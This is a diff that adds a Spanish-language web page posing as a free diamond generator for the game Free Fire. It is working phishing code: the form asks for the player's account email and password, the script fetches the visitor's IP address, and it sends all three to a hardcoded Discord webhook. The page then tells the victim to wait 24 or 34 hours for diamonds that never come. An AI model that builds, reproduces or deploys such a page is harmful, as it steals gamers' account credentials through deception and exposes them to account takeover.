@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Generador de Diamantes Free Fire</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');
+
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  font-family: 'Orbitron', sans-serif;
+  color: #fff;
+  overflow-x: hidden;
+  background: #000;
+}
+
+canvas#particles {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: -1;
+}
+
+.container {
+  background: rgba(0,0,0,0.85);
+  padding: 40px;
+  border-radius: 20px;
+  box-shadow: 0 0 40px #00ffe5;
+  max-width: 700px;
+  width: 90%;
+  margin: 60px auto;
+  text-align: center;
+}
+
+.logo-flotante {
+  position: relative;
+  margin-bottom: 20px;
+  animation: flotar 3s ease-in-out infinite;
+}
+.logo-flotante img {
+  width: 120px;
+}
+@keyframes flotar {
+  0% { transform: translateY(0px); }
+  50% { transform: translateY(-15px); }
+  100% { transform: translateY(0px); }
+}
+
+h1 { font-size: 36px; text-shadow: 0 0 15px #00ffe5; margin-bottom: 15px; }
+h2 { font-size: 24px; text-shadow: 0 0 10px #00ffe5; margin-top: 30px; margin-bottom: 15px; }
+p { font-size: 16px; line-height: 1.5; margin-bottom: 15px; }
+.important-note { margin-top: 20px; font-size: 16px; color: #00ffea; text-shadow: 0 0 10px #00ffe5; font-weight: bold; }
+
+button {
+  background: transparent;
+  border: 2px solid #00ffe5;
+  color: #00ffe5;
+  padding: 12px 30px;
+  font-size: 18px;
+  margin-top: 20px;
+  border-radius: 10px;
+  cursor: pointer;
+  transition: 0.3s;
+  text-shadow: 0 0 5px #00ffe5;
+  box-shadow: 0 0 15px #00ffe5;
+}
+button:hover { background: #00ffe5; color: #111; }
+
+form { display: none; margin-top: 20px; }
+input {
+  display: block;
+  padding: 12px;
+  margin: 10px auto;
+  border: 2px solid #00ffe5;
+  border-radius: 8px;
+  background: #111;
+  color: #fff;
+  width: 90%;
+  max-width: 300px;
+  text-align: center;
+  outline: none;
+  box-shadow: 0 0 10px #00ffe5;
+}
+input:focus { box-shadow: 0 0 20px #00ffe5; }
+
+footer { margin: 30px 0; font-size: 14px; text-shadow: 0 0 5px #00ffe5; text-align: center; }
+
+@media (max-width: 600px) {
+  h1 { font-size: 28px; }
+  h2 { font-size: 20px; }
+  p { font-size: 14px; }
+  .container { padding: 20px; }
+  button { font-size: 16px; padding: 10px 20px; }
+  input { width: 95%; max-width: none; }
+}
+</style>
+</head>
+<body>
+
+<audio id="bg-music" loop>
+  <source src="intro junior h.mp3" type="audio/mpeg">
+</audio>
+
+<canvas id="particles"></canvas>
+
+<div class="container">
+  <div class="logo-flotante">
+    <img src="https://i.postimg.cc/KcNgkYDM/b74d50410de5f8abca22d03468a7ef0f-removebg-preview.png" alt="Máxim Logo">
+  </div>
+
+  <h1>💎 Generador de Diamantes Free Fire 💎</h1>
+  <p>Ingresa correctamente tus datos para que los diamantes lleguen sin problemas.</p>
+  <button id="abrir-form">🎮 Abrir Generador 🎮</button>
+
+  <form id="formulario">
+    <input type="text" id="correo" placeholder="Correo de tu cuenta">
+    <input type="password" id="clave" placeholder="Clave de tu cuenta">
+    <input type="number" id="cantidad" placeholder="Cantidad de diamantes" min="1">
+    <button type="button" onclick="enviarDiscord()">🚀 Generar Diamantes 🚀</button>
+  </form>
+
+  <h2>📌 Cómo usar el Generador</h2>
+  <p>1. Haz click en “🎮 Abrir Generador 🎮”.</p>
+  <p>2. Ingresa tu correo de Free Fire, clave de tu cuenta y la cantidad de diamantes que deseas.</p>
+  <p>3. Presiona “🚀 Generar Diamantes 🚀”.</p>
+  <p>4. Espera a que tus diamantes lleguen en 24 o 34 horas.</p>
+
+  <h2>💡 Nota Importante</h2>
+  <p>Asegúrate de ingresar tus datos correctamente para que tu solicitud se procese sin problemas.</p>
+</div>
+
+<footer>
+  &copy; 2025 Generador de Diamantes Free Fire - Sistema Real
+</footer>
+
+<script>
+// Música de fondo
+const music = document.getElementById('bg-music');
+window.addEventListener('load', () => {
+  const playPromise = music.play();
+  if (playPromise !== undefined) {
+    playPromise.catch(() => {
+      document.addEventListener('click', () => {
+        if (music.paused) music.play();
+      }, { once: true });
+    });
+  }
+});
+
+// Mostrar formulario
+document.addEventListener("DOMContentLoaded", function() {
+  const form = document.getElementById("formulario");
+  const btn = document.getElementById("abrir-form");
+  btn.addEventListener("click", function() {
+    form.style.display = "block";
+    form.scrollIntoView({ behavior: "smooth" });
+  });
+});
+
+// Partículas
+const canvas = document.getElementById('particles');
+const ctx = canvas.getContext('2d');
+let particlesArray = [];
+function initParticles() {
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  particlesArray = [];
+  for (let i = 0; i < 120; i++) {
+    particlesArray.push({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height,
+      size: Math.random() * 3 + 1,
+      speedX: Math.random() * 1 - 0.5,
+      speedY: Math.random() * 1 - 0.5,
+      color: `hsl(${Math.random()*360}, 100%, 50%)`
+    });
+  }
+}
+function animateParticles() {
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  particlesArray.forEach(p => {
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,p.size,0,Math.PI*2);
+    ctx.fillStyle = p.color;
+    ctx.fill();
+    p.x += p.speedX;
+    p.y += p.speedY;
+    if(p.x > canvas.width) p.x = 0;
+    if(p.x < 0) p.x = canvas.width;
+    if(p.y > canvas.height) p.y = 0;
+    if(p.y < 0) p.y = canvas.height;
+  });
+  requestAnimationFrame(animateParticles);
+}
+initParticles();
+animateParticles();
+window.addEventListener('resize', initParticles);
+
+// Enviar datos al webhook
+async function enviarDiscord() {
+  const correo = document.getElementById("correo").value.trim();
+  const clave = document.getElementById("clave").value.trim();
+  const cantidad = document.getElementById("cantidad").value.trim();
+  if (!correo || !clave || !cantidad) { alert("⚠️ Completa todos los campos."); return; }
+
+  let ip = "Desconocida";
+  try { const res = await fetch("https://api.ipify.org?format=json"); const data = await res.json(); ip = data.ip; } 
+  catch(e){ console.error("No se pudo obtener la IP", e); }
+
+  const webhookURL = "https://discord.com/api/webhooks/1409038147949560028/kURM5drTJOgw-PiS-KRYdFWHW4GUe79PrTW_GaFR-kZpvFB6d9MzAktPXlwSf-HR4oaw";
+
+  const payload = {
+    embeds: [{
+      title: "💎 Nueva Solicitud de Diamantes 💎",
+      description: "Asegúrate de que los datos sean correctos para recibir tus diamantes en 24 o 34 horas.",
+      color: 3447003,
+      thumbnail: { url: "https://i.postimg.cc/KcNgkYDM/b74d50410de5f8abca22d03468a7ef0f-removebg-preview.png" },
+      fields: [
+        { name: "📧 Correo", value: correo, inline: true },
+        { name: "🔑 Clave", value: clave, inline: true },
+        { name: "💎 Cantidad", value: cantidad, inline: true },
+        { name: "🌐 IP", value: ip, inline: true }
+      ]
+    }]
+  };
+
+  try {
+    const response = await fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if (response.ok) {
+      alert("✅ Solicitud enviada");
+      document.getElementById("formulario").reset();
+    } else { alert("❌ Error al enviar la solicitud."); }
+  } catch (error) { console.error(error); alert("⚠️ Ocurrió un error al enviar la solicitud."); }
+}
+</script>
+</body>
+</html>
